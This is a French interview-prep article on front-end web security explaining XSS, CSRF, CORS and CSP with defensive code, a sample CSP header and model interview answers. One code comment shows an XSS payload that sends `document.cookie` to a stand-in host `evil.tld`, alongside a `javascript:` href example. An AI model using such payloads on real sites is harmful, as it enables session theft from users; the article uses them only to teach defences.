---
title: "Sécurité front : XSS, CSRF, CORS & CSP"
date: "2026-09-23"
category: "Sécurité"
level: "Intermédiaire"
summary: "XSS, CSRF, CORS, CSP : quatre sigles que tout candidat full-stack doit savoir distinguer en 30 secondes — et l'éternelle question « où stocker le JWT ? » enfin tranchée honnêtement."
---

## L'essentiel

Le navigateur exécute du code téléchargé depuis Internet au milieu de vos données de session : c'est un environnement hostile par construction. Quatre mécanismes structurent la sécurité front, et les entretiens adorent vérifier qu'on ne les confond pas :

- **XSS** (Cross-Site Scripting) : l'attaquant fait **exécuter son JavaScript** dans votre page, chez vos utilisateurs. Il peut alors lire le DOM, voler des données, agir au nom de l'utilisateur.
- **CSRF** (Cross-Site Request Forgery) : l'attaquant fait **envoyer une requête authentifiée** par le navigateur de la victime, sans exécuter de code chez vous — il exploite le fait que les cookies partent tout seuls.
- **CORS** : pas une attaque, un **assouplissement contrôlé** de la same-origin policy du navigateur, qui décide quelles pages web peuvent *lire* les réponses de votre API.
- **CSP** (Content Security Policy) : une **liste blanche déclarative** de ce que la page a le droit de charger et d'exécuter — le filet de sécurité anti-XSS.

| Attaque | Mécanisme | Parade principale |
|---|---|---|
| XSS stocké | Payload persisté (commentaire en DB) puis servi à tous | Échappement contextuel à l'affichage + CSP |
| XSS réfléchi | Payload dans l'URL, renvoyé tel quel dans la page | Échappement, validation + CSP |
| XSS DOM | Le JS client injecte une donnée non fiable (`innerHTML`) | `textContent`, sanitization (DOMPurify) |
| CSRF | Le navigateur joint les cookies automatiquement | Token anti-CSRF + cookie `SameSite` + vérif `Origin` |
| Clickjacking | Votre site dans une iframe invisible | `frame-ancestors 'none'` (CSP) |

## Comment ça marche

**XSS** : tout endroit où une donnée contrôlée par un utilisateur devient du HTML/JS est une porte d'entrée. Trois variantes : **stocké** (le payload vit en base et touche tous les visiteurs), **réfléchi** (le payload voyage dans l'URL, il faut faire cliquer la victime), **DOM-based** (la faille est entièrement côté client : `element.innerHTML = userInput`). La parade est l'**échappement contextuel** : la même chaîne ne s'échappe pas pareil dans du HTML, un attribut, du JS ou une URL. Les frameworks modernes (React, Vue) échappent par défaut — les failles se nichent dans les échappatoires : `dangerouslySetInnerHTML`, `v-html`, `href` construit à la main (`javascript:...`).

```js
// ❌ DANGEREUX : le HTML de l'utilisateur est interprété
div.innerHTML = comment;
// payload typique :
// <img src=x onerror="fetch('https://evil.tld/?c='+document.cookie)">

// ✅ Le texte reste du texte : le payload s'affiche, ne s'exécute pas
div.textContent = comment;

// ✅ Besoin de HTML riche (éditeur, markdown) ? On sanitize :
import DOMPurify from "dompurify";
div.innerHTML = DOMPurify.sanitize(comment);
```

**CSRF** : le navigateur joint **automatiquement** les cookies d'un site à toute requête vers ce site, même déclenchée depuis une autre page. Il suffit donc d'attirer une victime connectée sur `evil.site` :

```text
victime ── session ouverte sur bank.com (cookie)
   │
   │ visite evil.site
   ▼
evil.site : formulaire caché auto-soumis
   │   POST https://bank.com/transfer
   ▼
le navigateur JOINT le cookie de session
   ▼
bank.com : requête authentifiée valide…
           sans protection → virement exécuté
```

Parades combinées : **token anti-CSRF** (secret aléatoire injecté dans la page, renvoyé avec la requête — `evil.site` ne peut pas le lire, same-origin policy oblige), cookie **`SameSite=Lax`** (défaut moderne des navigateurs : le cookie ne part plus sur les requêtes cross-site, sauf navigation top-level en GET) ou `Strict`, et vérification du header `Origin` côté serveur.

**CORS** : par défaut, la same-origin policy interdit au JS de `site-a.com` de **lire** la réponse d'une requête vers `api.site-b.com`. CORS permet au serveur d'**autoriser** explicitement des origines (`Access-Control-Allow-Origin`). Pour les requêtes « non simples » (JSON, headers custom, `PUT`/`DELETE`), le navigateur envoie d'abord un **preflight** `OPTIONS` pour demander la permission.

**CSP** : un header qui déclare d'où la page peut charger scripts, styles, images — et qui, bien configuré, bloque les scripts inline. Même si un payload XSS passe, il ne s'exécute pas : c'est de la défense en profondeur, pas un remplacement de l'échappement.

```text
Content-Security-Policy:
  default-src 'self';        # par défaut : mon origine seule
  script-src 'self';         # ni script inline, ni CDN non listé
  img-src 'self' data:;      # images locales + data-URI
  frame-ancestors 'none';    # personne ne m'iframe (clickjacking)
```

> ⚠️ **CORS ne protège pas ton API** — CORS est appliqué **par le navigateur, uniquement** : `curl`, Postman ou un serveur ignorent totalement ces headers. CORS protège les *utilisateurs* (il empêche une page malveillante de lire vos réponses avec leurs cookies), pas votre serveur. La sécurité de l'API, c'est l'authentification et l'autorisation. Corollaire : `Access-Control-Allow-Origin: *` n'« ouvre » pas votre API aux pirates — et le restreindre ne la sécurise pas.

## Concepts clés à maîtriser

- **Échappement contextuel ≠ validation d'entrée** : on valide à l'entrée (format, longueur), mais on échappe **à la sortie, selon le contexte** d'insertion. Échapper à l'entrée « une fois pour toutes » casse les données et rate des contextes.
- **`SameSite`** : `Strict` (le cookie ne part jamais en cross-site, même en cliquant un lien — déconnexions surprenantes), `Lax` (défaut : part uniquement sur les navigations top-level en GET), `None` (part toujours, exige `Secure`). `Lax` bloque le CSRF classique en POST — d'où la règle : **jamais de mutation d'état en GET**.
- **Preflight** : requête `OPTIONS` automatique avant une requête non simple ; le serveur répond avec les méthodes/headers/origines autorisés (`Access-Control-Allow-*`). Si le preflight échoue, la vraie requête n'est jamais envoyée. C'est la fameuse « erreur CORS » de la console.
- **Stockage des tokens — le vrai arbitrage** : en `localStorage`, le token est lisible par n'importe quel XSS → exfiltration directe. En **cookie `httpOnly`**, le JS ne peut pas le lire (XSS ne peut plus le *voler*)… mais il part tout seul → il faut gérer le CSRF (`SameSite` + token). Recommandation générale : cookie `httpOnly` + `Secure` + `SameSite`, protections CSRF en place. Et rester honnête : un XSS reste grave même avec `httpOnly` — l'attaquant ne vole pas le token, mais il fait des requêtes authentifiées *depuis la page*.
- **CSP réaliste** : partir de `default-src 'self'`, éviter `'unsafe-inline'` (qui annule l'intérêt), utiliser nonces ou hashes pour les scripts inline légitimes, et déployer d'abord en `Content-Security-Policy-Report-Only` pour mesurer la casse.

> 💡 **Les frameworks échappent, les échappatoires tuent** — React échappe tout ce qui passe dans du JSX : `{userInput}` est sûr. Les failles XSS des apps React se trouvent presque toujours au même endroit : `dangerouslySetInnerHTML` sans sanitization, ou un `<a href={userInput}>` qui accepte `javascript:alert(1)`. Le nom de l'API vous prévient — écoutez-le.

## En entretien

**« Explique la différence entre XSS et CSRF. »** — XSS : l'attaquant **exécute son code** dans ma page ; il peut tout lire et tout faire au nom de l'utilisateur ; parade = échappement contextuel + CSP. CSRF : l'attaquant **déclenche une requête authentifiée** depuis un autre site, sans exécuter de code chez moi, en profitant des cookies envoyés automatiquement ; parade = token anti-CSRF + `SameSite`. L'un injecte du code, l'autre profite des cookies.

**« Où stocker un JWT côté front ? »** — Donner l'arbitrage, pas un dogme : `localStorage` = vulnérable à l'exfiltration par XSS ; cookie `httpOnly` = illisible par le JS mais expose au CSRF, qu'on couvre avec `SameSite` + token. Préférence générale : cookie `httpOnly`/`Secure`/`SameSite`. Bonus : tokens à courte durée de vie + refresh, et rappeler qu'un XSS reste grave dans les deux cas.

**« À quoi sert CORS ? C'est quoi un preflight ? »** — CORS assouplit la same-origin policy : le serveur déclare quelles origines peuvent lire ses réponses depuis un navigateur. Le preflight est le `OPTIONS` envoyé avant les requêtes non simples pour demander la permission. Point bonus décisif : préciser que CORS ne protège pas le serveur — un client hors navigateur l'ignore.

**« Comment prévenir le XSS dans une app React ? »** — S'appuyer sur l'échappement par défaut du JSX, bannir `dangerouslySetInnerHTML` (ou le passer systématiquement par DOMPurify), valider les URLs des `href`, et ajouter une CSP sans `'unsafe-inline'` comme défense en profondeur.

**« C'est quoi SameSite ? »** — Un attribut de cookie qui contrôle son envoi en contexte cross-site : `Strict` (jamais), `Lax` (navigations top-level GET seulement — le défaut), `None` (toujours, avec `Secure`). C'est la défense anti-CSRF native des navigateurs, à combiner avec un token pour les cas limites.

## Pièges & idées reçues

- **« Erreur CORS → je désactive CORS / je mets un proxy »** — l'erreur signifie que *votre serveur* n'autorise pas votre origine : la solution est une ligne de config côté API (`Access-Control-Allow-Origin`), pas un contournement. Le proxy de dev est un pansement local, pas un fix.
- **« React/Vue me protègent du XSS »** — par défaut oui, mais `dangerouslySetInnerHTML`, `v-html` et les URLs `javascript:` réintroduisent la faille en une ligne.
- **Sanitizer à l'entrée et se croire tranquille** — l'échappement dépend du contexte de *sortie* ; une donnée saine en HTML peut être dangereuse dans un attribut ou une URL.
- **`SameSite=Lax` et mutations en GET** — `Lax` laisse passer les navigations GET top-level : un lien `<a href="https://site.com/delete?id=1">` reste un CSRF fonctionnel si votre API mute en GET.
- **Une CSP avec `'unsafe-inline'`** — c'est une CSP de décoration : les payloads XSS sont précisément des scripts inline.

> 🎤 **En entretien** — entraînez-vous à dérouler « XSS vs CSRF » en 30 secondes chrono, avec une parade chacun. C'est LA question discriminante de sécurité front : ceux qui confondent les deux échouent, ceux qui terminent par « et CORS n'a rien à voir, c'est un mécanisme navigateur, pas une protection serveur » marquent les points.

## Pour aller plus loin

- [OWASP — XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) et [CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — CORS](https://developer.mozilla.org/fr/docs/Web/HTTP/CORS) et [MDN — CSP](https://developer.mozilla.org/fr/docs/Web/HTTP/CSP) : les références lisibles
- [PortSwigger Web Security Academy](https://portswigger.net/web-security) : labs gratuits XSS/CSRF/CORS — le meilleur entraînement pratique
- [CSP Evaluator (Google)](https://csp-evaluator.withgoogle.com/) : coller votre CSP et voir ses trous
